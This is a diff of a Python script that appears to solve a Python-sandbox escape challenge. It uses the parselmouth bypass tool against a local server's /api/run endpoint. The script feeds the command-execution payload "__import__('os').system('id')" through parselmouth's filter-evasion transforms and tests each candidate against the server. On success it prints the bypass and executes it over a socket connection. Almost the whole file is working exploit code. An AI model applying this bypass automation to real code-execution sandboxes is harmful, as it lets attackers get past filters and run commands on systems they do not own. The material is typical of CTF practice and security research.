@@ -1,32 +1,27 @@
-import ast
-import os
 import sys
 import threading
 import time
 import requests
 import socketio
+from pathlib import Path
 
-ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+sys.path.insert(0, str(Path(__file__).resolve().parents[2]))
+
 SERVER_URL = "http://127.0.0.1:6000"
 PAYLOAD = "__import__('os').system('id')"
-
-sys.path.insert(0, ROOT)
 
 import parselmouth as p9h
 
 
-def challenge_check(payload):
-    if isinstance(payload, ast.AST):
-        payload = ast.unparse(payload)
-
+def challenge_check(payload, ignore_space=False):
     response = requests.post(
         SERVER_URL + "/api/run",
         json={
             "code": payload,
             "args": "",
-        },
-        timeout=5,
+        }
     ).json()
+
     if response.get("success"):
         pid = response.get("pid")
         if pid:
@@ -86,23 +81,20 @@ def execute_payload(payload):
             sio.disconnect()
 
 
-orig_check = p9h.check
 p9h.check = challenge_check
-try:
-    transformed = p9h.P9H(
-        PAYLOAD,
-        versbose=2,
-    ).visit()
-finally:
-    p9h.check = orig_check
+runner = p9h.P9H(
+    PAYLOAD, versbose=1
+)
+result = runner.visit()
+status, c_result = p9h.color_check(result)
+if status:
+    print("bypass success")
+    print("payload:", runner.source_code)
+    print("exp:", result)
 
-response, stdout = execute_payload(transformed)
+    response, stdout = execute_payload(result)
 
-print("[*] input payload:")
-print(PAYLOAD)
-print("\n[*] transformed payload:")
-print(transformed)
-print("\n[*] api response:")
-print(response)
-print("\n[*] stdout:")
-print(stdout.rstrip())
+    print("\n[*] api response:")
+    print(response)
+    print("\n[*] stdout:")
+    print(stdout.rstrip())
